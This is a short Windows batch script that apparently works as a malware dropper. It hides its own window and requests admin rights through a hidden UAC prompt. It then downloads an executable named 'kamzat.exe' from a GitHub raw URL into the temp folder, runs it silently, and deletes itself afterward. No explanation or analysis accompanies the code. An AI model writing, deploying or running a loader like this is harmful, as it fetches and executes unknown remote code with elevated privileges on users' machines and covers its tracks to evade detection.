@echo off
setlocal enabledelayedexpansion

:: Hide the window immediately
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

:: Check for admin privileges
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    goto admin_tasks
)

:: Elevate with UAC (hidden)
powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
exit /b

:admin_tasks
:: Download the file immediately after getting admin rights
powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\kamzat.exe' -UseBasicParsing } catch { exit 1 }"

:: Execute if download was successful
if exist "%TEMP%\kamzat.exe" (
    start "" /B "%TEMP%\kamzat.exe"
    
    :: Cleanup - remove the batch file itself
    ping -n 3 127.0.0.1 >nul
    del "%~f0" >nul 2>&1
)
exit /b
